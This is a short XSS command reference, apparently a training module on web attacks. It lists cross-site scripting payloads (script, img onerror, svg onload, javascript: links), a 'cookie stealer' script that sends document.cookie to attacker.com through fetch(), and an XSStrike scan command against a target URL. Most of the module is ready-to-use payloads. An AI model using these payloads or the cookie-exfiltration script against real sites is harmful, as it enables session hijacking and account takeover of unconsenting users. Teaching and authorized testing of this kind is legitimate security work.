# Module 09: XSS Command Reference

### 1. Basic Testing Payloads
These are used to check if a field is vulnerable.

| Goal | Payload | Note |
| :--- | :--- | :--- |
| **Simple Alert** | `<script>alert(1)</script>` | The "Hello World" of XSS. |
| **Image Tag Bypass** | `<img src=x onerror=alert(1)>` | Bypasses filters that block `<script>`. |
| **SVG Tag Bypass** | `<svg onload=alert(1)>` | Another common bypass technique. |
| **Anchor Tag** | `<a href="javascript:alert(1)">Click Me</a>` | Requires user interaction. |

### 2. Advanced Payloads (Data Theft)
Instead of an alert, we want to send the user's cookies to our own server.

**The Cookie Stealer:**
```javascript
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### 3. Automated Tools
| Tool | Description | Use Case |
| :--- | :--- | :--- |
| **XSStrike** | Advanced XSS scanner | Intelligent fuzzing and payload generation. |
| **Burp Suite Intruder** | Request automation | Testing hundreds of payloads against a field. |
| **KiteRunner** | API endpoint discovery | Finding hidden parameters for XSS. |

### The "XSS Chain" (Example):
Find an input $\rightarrow$ Test for reflection $\rightarrow$ Bypass filter $\rightarrow$ Steal cookie:
```bash
# Using a tool like XSStrike
python3 xsstrike.py -u "http://target.com/search?q=test"
```
